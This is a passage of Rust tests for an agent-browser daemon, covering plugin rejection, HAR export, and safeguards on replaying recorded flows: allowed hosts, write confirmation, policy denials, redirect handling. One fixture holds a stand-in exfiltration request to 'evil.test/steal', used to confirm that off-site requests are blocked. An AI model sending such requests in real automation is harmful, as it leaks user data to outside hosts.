        guard.remove("AGENT_BROWSER_ALLOWED_DOMAINS");
        let dir = tempfile::tempdir().unwrap();
        let plugin_path = dir.path().join("mock-launch-mutator");
        fs::write(
            &plugin_path,
            r#"#!/bin/sh
cat >/dev/null
printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"launch":{"args":["--user-data-dir=/tmp/plugin-profile"]}}'
"#,
        )
        .unwrap();
        let mut perms = fs::metadata(&plugin_path).unwrap().permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&plugin_path, perms).unwrap();

        let mut state = DaemonState::new();
        let error = handle_launch(
            &json!({
                "action": "launch",
                "allowedDomains": ["example.com"],
                "plugins": [
                    {
                        "name": "profile-mutator",
                        "command": plugin_path.to_string_lossy(),
                        "capabilities": ["launch.mutate"]
                    }
                ]
            }),
            &mut state,
        )
        .await
        .unwrap_err();

        assert!(error.contains("--args"), "got: {}", error);
        assert!(error.contains("--user-data-dir"), "got: {}", error);
        assert!(
            state.domain_filter.read().await.is_none(),
            "rejected plugin args should not commit allowedDomains"
        );
        assert!(
            state.browser.is_none(),
            "plugin args should be rejected before launching Chrome"
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn test_allowed_domains_reject_direct_page_provider_plugins() {
        use std::os::unix::fs::PermissionsExt;

        let guard = EnvGuard::new(&["AGENT_BROWSER_ALLOWED_DOMAINS"]);
        guard.remove("AGENT_BROWSER_ALLOWED_DOMAINS");
        let dir = tempfile::tempdir().unwrap();
        let plugin_path = dir.path().join("mock-direct-page-provider");
        fs::write(
            &plugin_path,
            r#"#!/bin/sh
cat >/dev/null
printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cdpUrl":"ws://127.0.0.1:9222/devtools/page/test","directPage":true}}'
"#,
        )
        .unwrap();
        let mut perms = fs::metadata(&plugin_path).unwrap().permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&plugin_path, perms).unwrap();

        let mut state = DaemonState::new();
        let error = handle_launch(
            &json!({
                "action": "launch",
                "provider": "direct-page",
                "allowedDomains": ["example.com"],
                "plugins": [
                    {
                        "name": "direct-page",
                        "command": plugin_path.to_string_lossy(),
                        "capabilities": ["browser.provider"]
                    }
                ]
            }),
            &mut state,
        )
        .await
        .unwrap_err();

        assert!(
            error.contains("direct-page browser providers"),
            "got: {}",
            error
        );
        assert!(
            state.domain_filter.read().await.is_none(),
            "rejected direct-page provider should not commit allowedDomains"
        );
        assert!(
            state.browser.is_none(),
            "direct-page provider should be rejected before CDP connect"
        );
    }

    #[test]
    fn test_write_extensions_file_from_paths_uses_final_extensions() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_SOCKET_DIR", "AGENT_BROWSER_EXTENSIONS"]);
        let dir = tempfile::tempdir().unwrap();
        guard.set("AGENT_BROWSER_SOCKET_DIR", dir.path().to_str().unwrap());
        guard.set("AGENT_BROWSER_EXTENSIONS", "/env/ext");
        let extensions = vec![
            " /plugin/ext ".to_string(),
            "".to_string(),
            "/plugin/other".to_string(),
        ];

        write_extensions_file_from_paths("metadata-test", &Running::from_env(), Some(&extensions));

        let content = fs::read_to_string(extensions_file_path("metadata-test")).unwrap();
        assert_eq!(content, "/plugin/ext,/plugin/other");
    }

    #[test]
    fn test_write_extensions_file_from_paths_falls_back_to_env() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_SOCKET_DIR", "AGENT_BROWSER_EXTENSIONS"]);
        let dir = tempfile::tempdir().unwrap();
        guard.set("AGENT_BROWSER_SOCKET_DIR", dir.path().to_str().unwrap());
        guard.set("AGENT_BROWSER_EXTENSIONS", "/env/ext");

        write_extensions_file_from_paths("metadata-env-test", &Running::from_env(), None);

        let content = fs::read_to_string(extensions_file_path("metadata-env-test")).unwrap();
        assert_eq!(content, "/env/ext");
    }

    #[test]
    fn test_har_entry_to_json_enriches_request_and_response() {
        // wall_time: 2026-03-15T12:00:00Z = 1_773_576_000
        let entry = HarEntry {
            request_id: "req-1".to_string(),
            wall_time: 1773576000.0,
            method: "POST".to_string(),
            url: "https://example.com/api?foo=bar&baz=qux".to_string(),
            request_headers: vec![
                ("Accept".to_string(), "application/json".to_string()),
                ("Content-Type".to_string(), "application/json".to_string()),
                ("Cookie".to_string(), "session=abc; theme=dark".to_string()),
            ],
            post_data: Some(r#"{"x":1}"#.to_string()),
            request_body_size: 7,
            resource_type: "XHR".to_string(),
            status: Some(201),
            status_text: "Created".to_string(),
            http_version: "HTTP/2.0".to_string(),
            response_headers: vec![
                ("content-type".to_string(), "application/json".to_string()),
                (
                    "location".to_string(),
                    "https://example.com/api/1".to_string(),
                ),
                (
                    "set-cookie".to_string(),
                    "token=xyz; Path=/; HttpOnly".to_string(),
                ),
            ],
            mime_type: "application/json".to_string(),
            redirect_url: "https://example.com/api/1".to_string(),
            response_body_size: 42,
            cdp_timing: None,
            loading_finished_timestamp: None,
            response_body: None,
            response_body_base64: false,
            remote_addr: None,
        };

        let har = har_entry_to_json(&entry);
        assert_eq!(har["startedDateTime"], "2026-03-15T12:00:00Z");
        assert_eq!(har["request"]["method"], "POST");
        assert_eq!(har["request"]["httpVersion"], "HTTP/2.0");
        assert_eq!(har["request"]["queryString"][0]["name"], "foo");
        assert_eq!(har["request"]["queryString"][0]["value"], "bar");
        assert_eq!(har["request"]["bodySize"], 7);
        assert_eq!(har["request"]["postData"]["mimeType"], "application/json");
        assert_eq!(har["request"]["postData"]["text"], r#"{"x":1}"#);
        assert_eq!(har["request"]["cookies"][0]["name"], "session");
        assert_eq!(har["request"]["cookies"][0]["value"], "abc");
        assert_eq!(har["request"]["cookies"][1]["name"], "theme");
        assert_eq!(har["request"]["cookies"][1]["value"], "dark");
        assert_eq!(har["response"]["status"], 201);
        assert_eq!(har["response"]["statusText"], "Created");
        assert_eq!(har["response"]["content"]["mimeType"], "application/json");
        assert_eq!(har["response"]["content"]["size"], 42);
        assert_eq!(har["response"]["redirectURL"], "https://example.com/api/1");
        assert_eq!(har["response"]["cookies"][0]["name"], "token");
        assert_eq!(har["response"]["cookies"][0]["value"], "xyz");
        assert_eq!(har["_resourceType"], "XHR");
        // No body captured: content carries size/MIME only.
        assert!(har["response"]["content"].get("text").is_none());
        assert!(har["response"]["content"].get("encoding").is_none());
    }

    #[test]
    fn test_har_entry_to_json_embeds_response_body() {
        let mut entry = HarEntry {
            request_id: "req-2".to_string(),
            wall_time: 1773576000.0,
            method: "GET".to_string(),
            url: "https://example.com/api/items".to_string(),
            request_headers: vec![],
            post_data: None,
            request_body_size: 0,
            resource_type: "XHR".to_string(),
            status: Some(200),
            status_text: "OK".to_string(),
            http_version: "HTTP/2.0".to_string(),
            response_headers: vec![],
            mime_type: "application/json".to_string(),
            redirect_url: String::new(),
            response_body_size: 13,
            cdp_timing: None,
            loading_finished_timestamp: None,
            response_body: Some(r#"{"items":[1]}"#.to_string()),
            response_body_base64: false,
            remote_addr: None,
        };

        let har = har_entry_to_json(&entry);
        assert_eq!(har["response"]["content"]["text"], r#"{"items":[1]}"#);
        assert!(har["response"]["content"].get("encoding").is_none());

        entry.response_body = Some("aGVsbG8=".to_string());
        entry.response_body_base64 = true;
        let har = har_entry_to_json(&entry);
        assert_eq!(har["response"]["content"]["text"], "aGVsbG8=");
        assert_eq!(har["response"]["content"]["encoding"], "base64");
    }

    #[test]
    fn test_har_mime_is_text() {
        assert!(har_mime_is_text("application/json"));
        assert!(har_mime_is_text("application/json; charset=utf-8"));
        assert!(har_mime_is_text("application/vnd.api+json"));
        assert!(har_mime_is_text("text/html"));
        assert!(har_mime_is_text("text/plain"));
        assert!(har_mime_is_text("image/svg+xml"));
        assert!(har_mime_is_text("application/x-www-form-urlencoded"));
        assert!(!har_mime_is_text("image/png"));
        assert!(!har_mime_is_text("application/octet-stream"));
        assert!(!har_mime_is_text("video/mp4"));
        assert!(!har_mime_is_text(""));
    }

    #[test]
    fn test_har_content_mode_parse() {
        assert_eq!(HarContentMode::parse("text"), Ok(HarContentMode::Text));
        assert_eq!(HarContentMode::parse("all"), Ok(HarContentMode::All));
        assert_eq!(HarContentMode::parse("none"), Ok(HarContentMode::None));
        assert!(HarContentMode::parse("everything").is_err());
        assert_eq!(HarContentMode::default(), HarContentMode::Text);
    }

    #[test]
    fn test_har_wall_time_to_rfc3339_epoch() {
        // Known timestamp: 2026-03-15T12:00:00Z = 1_773_576_000
        let result = har_wall_time_to_rfc3339(1773576000.0);
        assert!(result.starts_with("2026-03-15T12:00:00"));
    }

    #[test]
    fn test_har_wall_time_to_rfc3339_fractional_seconds() {
        let result = har_wall_time_to_rfc3339(1773576000.456);
        assert!(result.contains(".456") || result.contains("456"));
    }

    #[test]
    fn test_har_cdp_protocol_to_http_version() {
        assert_eq!(har_cdp_protocol_to_http_version("h2"), "HTTP/2.0");
        assert_eq!(har_cdp_protocol_to_http_version("h3"), "HTTP/3.0");
        assert_eq!(har_cdp_protocol_to_http_version("http/1.0"), "HTTP/1.0");
        assert_eq!(har_cdp_protocol_to_http_version("http/1.1"), "HTTP/1.1");
        assert_eq!(har_cdp_protocol_to_http_version("unknown"), "HTTP/1.1");
    }

    #[test]
    fn test_har_parse_request_cookies() {
        let cookies = har_parse_request_cookies("session=abc; theme=dark; empty=");
        assert_eq!(cookies.len(), 3);
        assert_eq!(cookies[0]["name"], "session");
        assert_eq!(cookies[0]["value"], "abc");
        assert_eq!(cookies[1]["name"], "theme");
        assert_eq!(cookies[1]["value"], "dark");
        assert_eq!(cookies[2]["name"], "empty");
        assert_eq!(cookies[2]["value"], "");
    }

    #[test]
    fn test_har_set_cookie_strips_attributes_before_equal_split() {
        let entry = HarEntry {
            request_id: "r".to_string(),
            wall_time: 1773576000.0,
            method: "GET".to_string(),
            url: "https://example.com/".to_string(),
            request_headers: vec![],
            post_data: None,
            request_body_size: 0,
            resource_type: "Document".to_string(),
            status: Some(200),
            status_text: "OK".to_string(),
            http_version: "HTTP/1.1".to_string(),
            response_headers: vec![(
                "set-cookie".to_string(),
                "token=abc; Path=/; HttpOnly".to_string(),
            )],
            mime_type: "text/html".to_string(),
            redirect_url: String::new(),
            response_body_size: 0,
            cdp_timing: None,
            loading_finished_timestamp: None,
            response_body: None,
            response_body_base64: false,
            remote_addr: None,
        };
        let har = har_entry_to_json(&entry);
        assert_eq!(har["response"]["cookies"][0]["name"], "token");
        assert_eq!(har["response"]["cookies"][0]["value"], "abc");
    }

    #[test]
    fn test_har_compute_timings_no_cdp_timing() {
        let (timings, total) = har_compute_timings(None, None);
        assert_eq!(timings["send"], 0);
        assert_eq!(timings["wait"], 0);
        assert_eq!(timings["receive"], 0);
        assert_eq!(total, 0.0);
    }

    #[test]
    fn test_har_compute_timings_with_cdp_timing() {
        let cdp = json!({
            "requestTime": 1000.0,
            "dnsStart": 0.0, "dnsEnd": 5.0,
            "connectStart": 5.0, "connectEnd": 15.0,
            "sslStart": 8.0, "sslEnd": 15.0,
            "sendStart": 15.0, "sendEnd": 16.0,
            "receiveHeadersStart": 16.0, "receiveHeadersEnd": 50.0,
        });
        let (timings, total) = har_compute_timings(Some(&cdp), Some(1000.1));
        assert_eq!(timings["dns"], 5.0);
        assert_eq!(timings["connect"], 10.0);
        assert_eq!(timings["ssl"], 7.0);
        assert_eq!(timings["send"], 1.0);
        assert!(total > 0.0);
    }

    #[tokio::test]
    async fn test_handle_har_stop_without_path_uses_default_location() {
        let mut state = DaemonState::new();
        state.har_recording = true;
        state.har_entries.push(HarEntry {
            request_id: "req-2".to_string(),
            wall_time: 1773576000.0,
            method: "GET".to_string(),
            url: "https://example.com/".to_string(),
            request_headers: vec![("Accept".to_string(), "text/html".to_string())],
            post_data: None,
            request_body_size: 0,
            resource_type: "Document".to_string(),
            status: Some(200),
            status_text: "OK".to_string(),
            http_version: "HTTP/2.0".to_string(),
            response_headers: vec![("content-type".to_string(), "text/html".to_string())],
            mime_type: "text/html".to_string(),
            redirect_url: String::new(),
            response_body_size: 128,
            cdp_timing: None,
            loading_finished_timestamp: None,
            response_body: None,
            response_body_base64: false,
            remote_addr: None,
        });

        let result = handle_har_stop(&json!({ "action": "har_stop" }), &mut state)
            .await
            .unwrap();

        let path = result["path"].as_str().unwrap();
        assert!(path.ends_with(".har"));
        assert!(std::path::Path::new(path).starts_with(get_har_dir()));
        assert_eq!(result["requestCount"], 1);
        assert!(!state.har_recording);
        assert!(state.har_entries.is_empty());

        let har: Value = serde_json::from_str(&fs::read_to_string(path).unwrap()).unwrap();
        assert_eq!(har["log"]["version"], "1.2");
        assert_eq!(har["log"]["creator"]["name"], "agent-browser");
        assert!(har["log"].get("browser").is_none());
        assert_eq!(har["log"]["entries"][0]["response"]["content"]["size"], 128);

        let _ = fs::remove_file(path);
    }

    #[tokio::test]
    async fn har_commands_are_refused_while_capture_owns_the_recorder() {
        let mut state = DaemonState::new();
        state.har_recording = true;
        state.flow.begin_capture(None);
        let stop = handle_har_stop(&json!({}), &mut state).await.unwrap_err();
        assert_eq!(stop, "capture is owned by --capture flow; use flow save");
        assert!(state.har_recording);
        let start = handle_har_start(&json!({}), &mut state).await.unwrap_err();
        assert!(start.contains("--capture flow"), "{start}");
    }

    #[tokio::test]
    async fn a_flow_edited_to_reach_another_host_is_rejected_before_any_request() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        let flow = json!({
            "version": 1, "name": "edited", "origin": "example.com",
            "startUrl": "https://example.com/", "allowedHosts": ["example.com"],
            "params": [], "output": "s1r1", "itemFields": [], "verifiedAt": null,
            "steps": [{ "seq": 1, "ok": true, "command": { "action": "navigate" }, "requests": [{
                "id": "s1r1", "method": "GET", "url": "https://evil.test/steal",
                "headers": {}, "body": null,
                "expect": { "status": 200, "mime": "application/json", "signature": {}, "bytes": 2, "itemFields": [], "extract": null }
            }] }]
        });
        save_flow_json(flow);
        let mut state = DaemonState::new();
        let err = handle_flow_run(
            &json!({ "name": "edited", "params": {} }),
            &mut state,
            super::super::flow::load_flow("edited", None).unwrap(),
        )
        .await
        .unwrap_err();
        assert!(
            err.contains("evil.test") && err.contains("outside the hosts"),
            "{err}"
        );
    }

    /// A flow with one POST to a local server that answers `{"ok":true}`.
    fn save_flow_json(flow: Value) {
        let flow = super::super::flow::flow_of(flow);
        super::super::flow::write_flow(&flow).unwrap();
    }

    fn write_flow_fixture(dir: &std::path::Path, port: u16) {
        let url = format!("http://127.0.0.1:{}/api/cart", port);
        let flow = json!({
            "version": 1, "name": "cart", "origin": "127.0.0.1",
            "startUrl": format!("http://127.0.0.1:{}/", port), "allowedHosts": ["127.0.0.1"],
            "params": [], "output": "s1r1", "itemFields": [], "verifiedAt": null,
            "writes": [{ "id": "s1r1", "method": "POST", "url": url, "kind": "explicit", "step": 1 }],
            "steps": [{ "seq": 1, "ok": true, "command": { "action": "click" }, "requests": [{
                "id": "s1r1", "method": "POST", "url": url, "headers": {}, "body": "{}",
                "expect": { "status": 200, "mime": "application/json",
                    "signature": super::super::flow::signature(&json!({ "ok": true })),
                    "bytes": 11, "itemFields": [], "extract": null }
            }] }]
        });
        let _ = dir;
        save_flow_json(flow);
    }

    fn serve_json_once() -> u16 {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        std::thread::spawn(move || {
            use std::io::{Read, Write};
            while let Ok((mut stream, _)) = listener.accept() {
                let mut buf = [0u8; 4096];
                let _ = stream.read(&mut buf);
                let body = r#"{"ok":true}"#;
                let _ = write!(
                    stream,
                    "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
            }
        });
        port
    }

    #[tokio::test]
    async fn flow_writes_go_through_confirmation_as_policy_actions() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        write_flow_fixture(dir.path(), serve_json_once());
        let run = json!({ "id": "r1", "action": "flow_run", "name": "cart", "params": {} });
        assert_eq!(
            policy_actions_for_command(
                &run,
                "flow_run",
                false,
                None,
                super::super::flow::load_flow("cart", None).ok().as_ref(),
                &Running::from_env(),
            ),
            vec!["flow_run".to_string(), "flow_write:s1r1".to_string()]
        );

        // Not allowed: the run asks, and a confirmation lets it through once.
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        let resp = execute_command(&run, &mut state).await;
        assert_eq!(resp["data"]["confirmation_required"], true, "{resp}");
        assert_eq!(resp["data"]["action"], "flow_write:s1r1");
        let confirmed =
            execute_command(&json!({ "id": "c1", "action": "confirm" }), &mut state).await;
        assert_eq!(
            confirmed["data"]["result"]["data"]["ok"], true,
            "{confirmed}"
        );

        // Allowed by id or by all: no confirmation.
        for allow in ["s1r1", "all"] {
            let mut cmd = run.clone();
            cmd["allowWrite"] = json!(allow);
            let resp = execute_command(&cmd, &mut state).await;
            assert_eq!(resp["data"]["ok"], true, "{allow}: {resp}");
        }

        // An id that is not a write of the flow is an error, not a pass.
        let mut cmd = run.clone();
        cmd["allowWrite"] = json!("nope");
        let resp = execute_command(&cmd, &mut state).await;
        assert!(
            resp["error"]
                .as_str()
                .unwrap()
                .contains("not a write of this flow"),
            "{resp}"
        );
    }

    fn serve_fixed(response: &'static str) -> u16 {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        std::thread::spawn(move || {
            use std::io::{Read, Write};
            while let Ok((mut stream, _)) = listener.accept() {
                let mut buf = [0u8; 4096];
                let _ = stream.read(&mut buf);
                let _ = stream.write_all(response.as_bytes());
            }
        });
        port
    }

    /// A server that counts the requests it reads and answers with `response`,
    /// or closes the connection when it is empty.
    fn serve_counting(
        response: &'static str,
    ) -> (u16, std::sync::Arc<std::sync::atomic::AtomicUsize>) {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let hits = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let counter = hits.clone();
        std::thread::spawn(move || {
            use std::io::{Read, Write};
            while let Ok((mut stream, _)) = listener.accept() {
                let mut buf = [0u8; 4096];
                let _ = stream.read(&mut buf);
                counter.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
                if !response.is_empty() {
                    let _ = stream.write_all(response.as_bytes());
                }
            }
        });
        (port, hits)
    }

    #[tokio::test]
    async fn a_write_is_sent_once_when_it_redirects_off_site_or_gets_no_answer() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        let cases: [(&'static str, &str); 4] = [
            ("HTTP/1.1 303 See Other\r\nLocation: http://localhost:9/x\r\ncontent-length: 0\r\nconnection: close\r\n\r\n", "was not followed"),
            ("HTTP/1.1 307 Temporary Redirect\r\nLocation: /api/cart\r\ncontent-length: 0\r\nconnection: close\r\n\r\n", "was not followed"),
            ("HTTP/1.1 308 Permanent Redirect\r\nLocation: /api/cart\r\ncontent-length: 0\r\nconnection: close\r\n\r\n", "was not followed"),
            ("", "outcome_unknown"),
        ];
        for (response, expect) in cases {
            let (port, hits) = serve_counting(response);
            write_flow_fixture(dir.path(), port);
            let run = json!({ "id": "r", "action": "flow_run", "name": "cart", "params": {}, "allowWrite": "all" });
            let mut state = DaemonState::new();
            state.policy = None;
            state.confirm_actions = None;
            let resp = execute_command(&run, &mut state).await;
            assert_eq!(resp["success"], false, "{resp}");
            assert!(resp["error"].as_str().unwrap().contains(expect), "{resp}");
            assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1, "{resp}");
            assert!(state.browser.is_none(), "no lower tier ran");
            if response.is_empty() {
                assert_eq!(resp["code"], "outcome_unknown");
            }
        }
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn a_flow_file_that_cannot_be_saved_does_not_hide_an_applied_write() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        // The site takes the write and answers with another shape.
        let (port, hits) = serve_counting("HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 13\r\nconnection: close\r\n\r\n{\"cart\":[7]}\n");
        write_flow_fixture(dir.path(), port);
        let origin_dir = dir.path().join("127.0.0.1");
        let file = origin_dir.join("cart.json");
        std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o400)).unwrap();
        std::fs::set_permissions(&origin_dir, std::fs::Permissions::from_mode(0o500)).unwrap();
        let run = json!({ "id": "r", "action": "flow_run", "name": "cart", "params": {}, "allowWrite": "all" });
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        let resp = execute_command(&run, &mut state).await;
        std::fs::set_permissions(&origin_dir, std::fs::Permissions::from_mode(0o700)).unwrap();
        std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o600)).unwrap();
        assert_eq!(resp["success"], false, "{resp}");
        assert_eq!(resp["code"], "write_applied", "{resp}");
        let error = resp["error"].as_str().unwrap();
        assert!(error.contains("do not repeat it"), "{resp}");
        assert!(error.contains("the flow file was not updated"), "{resp}");
        assert!(resp["data"]["saveError"].is_string(), "{resp}");
        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1);
    }

    #[tokio::test]
    async fn requests_of_an_unrecorded_command_are_not_tagged_to_the_previous_step() {
        let mut state = DaemonState::new();
        state.flow.begin_capture(None);
        state.flow.begin(
            "click",
            &json!({ "action": "click", "selector": "#a" }),
            &RefMap::new(),
            None,
            None,
        );
        let resp =
            execute_command(&json!({ "id": "s", "action": "session_info" }), &mut state).await;
        assert!(resp.get("recorded").is_none(), "{resp}");
        state.flow.tag(
            "sent-by-the-unrecorded-command",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs_f64(),
        );
        assert_eq!(state.flow.steps()["steps"][0]["requests"], 0);
    }

    #[tokio::test]
    async fn a_host_the_session_now_blocks_is_not_fetched_by_a_saved_flow() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        let (port, hits) = serve_counting("HTTP/1.1 200 OK\r\ncontent-length: 11\r\nconnection: close\r\ncontent-type: application/json\r\n\r\n{\"ok\":true}");
        write_flow_fixture(dir.path(), port);
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        *state.domain_filter.write().await =
            Some(super::super::network::DomainFilter::new("example.test"));
        let run = json!({ "id": "r", "action": "flow_run", "name": "cart", "params": {}, "allowWrite": "all" });
        let resp = execute_command(&run, &mut state).await;
        assert_eq!(resp["success"], false, "{resp}");
        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 0, "{resp}");
        // Redirects obey the same filter: the second host is never contacted.
        let (other, other_hits) =
            serve_counting("HTTP/1.1 200 OK\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}");
        let redirect: &'static str = Box::leak(
            format!("HTTP/1.1 302 Found\r\nLocation: http://localhost:{}/x\r\ncontent-length: 0\r\nconnection: close\r\n\r\n", other).into_boxed_str(),
        );
        let (port, hits) = serve_counting(redirect);
        write_flow_fixture(dir.path(), port);
        *state.domain_filter.write().await =
            Some(super::super::network::DomainFilter::new("127.0.0.1"));
        let resp = execute_command(&json!({ "id": "r2", "action": "flow_run", "name": "cart", "params": {}, "allowWrite": "all" }), &mut state).await;
        assert_eq!(resp["success"], false, "{resp}");
        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1);
        assert_eq!(other_hits.load(std::sync::atomic::Ordering::SeqCst), 0);
    }

    #[tokio::test]
    async fn the_replay_does_not_send_a_write_that_was_not_allowed() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        let flow = json!({
            "version": 1, "name": "buy", "origin": "127.0.0.1",
            "startUrl": "http://127.0.0.1:9/", "allowedHosts": ["127.0.0.1"],
            "params": [], "output": "s2r1", "itemFields": [], "verifiedAt": null,
            "writes": [{ "id": "s1w1", "method": "POST", "url": "http://127.0.0.1:9/buy", "kind": "explicit", "step": 1 }],
            "steps": [
                { "seq": 1, "ok": true, "command": { "action": "click", "selector": "#buy" }, "requests": [] },
                { "seq": 2, "ok": true, "command": { "action": "click", "selector": "#list" }, "requests": [{
                    "id": "s2r1", "method": "GET", "url": "http://127.0.0.1:9/items", "headers": {}, "body": null, "tier": "replay",
                    "expect": { "status": 200, "mime": "application/json", "signature": super::super::flow::signature(&json!({ "items": [] })), "bytes": 12, "itemFields": [], "extract": null }
                }] }
            ]
        });
        save_flow_json(flow);
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        let resp = execute_command(&json!({ "id": "r", "action": "flow_run", "name": "buy", "params": {}, "allowWrite": "false" }), &mut state).await;
        assert_eq!(resp["success"], false, "{resp}");
        let error = resp["error"].as_str().unwrap();
        assert!(error.contains("s1w1") && error.contains("allow"), "{error}");
        assert!(
            state.browser.is_none(),
            "no browser launched, so no click ran"
        );
    }

    #[tokio::test]
    async fn the_replay_needs_the_policy_and_confirmation_for_its_writes_too() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        save_flow_json(json!({
            "version": 1, "name": "buy", "origin": "127.0.0.1",
            "startUrl": "http://127.0.0.1:9/", "allowedHosts": ["127.0.0.1"],
            "params": [], "output": "s2r1", "itemFields": [], "verifiedAt": null,
            "writes": [{ "id": "s1w1", "method": "POST", "url": "http://127.0.0.1:9/buy", "kind": "explicit", "step": 1 }],
            "steps": [
                { "seq": 1, "ok": true, "command": { "action": "click", "selector": "#buy" }, "requests": [] },
                { "seq": 2, "ok": true, "command": { "action": "click", "selector": "#list" }, "requests": [{
                    "id": "s2r1", "method": "GET", "url": "http://127.0.0.1:9/items", "headers": {}, "body": null, "tier": "replay",
                    "expect": { "status": 200, "mime": "application/json", "signature": super::super::flow::signature(&json!({ "items": [] })), "bytes": 12, "itemFields": [], "extract": null }
                }] }
            ]
        }));
        let policy_with = |file: &str, body: &str| {
            let path = dir.path().join(file);
            std::fs::write(&path, body).unwrap();
            ActionPolicy::load(path.to_str().unwrap()).unwrap()
        };
        let run = json!({ "id": "r", "action": "flow_run", "name": "buy", "params": {}, "allowWrite": "all" });
        let cases: [(Option<ActionPolicy>, Option<ConfirmActions>, &str); 3] = [
            (
                Some(policy_with(
                    "deny.json",
                    r#"{"default":"allow","deny":["flow_write:s1w1"]}"#,
                )),
                None,
                "denied by policy",
            ),
            (
                Some(policy_with(
                    "confirm.json",
                    r#"{"default":"allow","confirm":["flow_write:s1w1"]}"#,
                )),
                None,
                "requires confirmation",
            ),
            (
                None,
                ConfirmActions::parse("flow_write:s1w1"),
                "requires confirmation",
            ),
        ];
        for (policy, confirm, expect) in cases {
            let mut state = DaemonState::new();
            state.policy = policy;
            state.confirm_actions = confirm;
            let resp = execute_command(&run, &mut state).await;
            assert_eq!(resp["success"], false, "{resp}");
            let error = resp["error"].as_str().unwrap_or_default();
            assert!(error.contains(expect), "{expect}: {resp}");
            assert!(
                state.browser.is_none(),
                "{expect}: the replay must not start"
            );
        }
    }

    #[tokio::test]
    async fn a_write_sent_by_one_tier_is_not_sent_again_by_the_replay() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        let (port, hits) = serve_counting(
            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
        );
        let base = format!("http://127.0.0.1:{}", port);
        let sig = super::super::flow::signature(&json!({ "ok": true }));
        let expect = json!({ "status": 200, "mime": "application/json", "signature": sig, "bytes": 11, "itemFields": [], "extract": null });
        let flow = json!({
            "version": 1, "name": "twice", "origin": "127.0.0.1",
            "startUrl": format!("{}/", base), "allowedHosts": ["127.0.0.1"],
            "params": [], "output": "s2r1", "itemFields": [], "verifiedAt": null,
            "writes": [{ "id": "s1r1", "method": "POST", "url": format!("{}/api/cart", base), "kind": "explicit", "step": 1 }],
            "steps": [
                { "seq": 1, "ok": true, "command": { "action": "click", "selector": "#add" }, "requests": [{
                    "id": "s1r1", "method": "POST", "url": format!("{}/api/cart", base), "headers": {}, "body": "{}", "expect": expect }] },
                { "seq": 2, "ok": true, "command": { "action": "click", "selector": "#list" }, "requests": [{
                    "id": "s2r1", "method": "GET", "url": format!("{}/api/items?c={{{{@s1r1.ok}}}}", base), "headers": {}, "body": null,
                    "tier": "replay", "expect": expect }] }
            ]
        });
        save_flow_json(flow);
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        let run = json!({ "id": "r", "action": "flow_run", "name": "twice", "params": {}, "allowWrite": "all" });
        let resp = execute_command(&run, &mut state).await;
        assert_eq!(resp["success"], false, "{resp}");
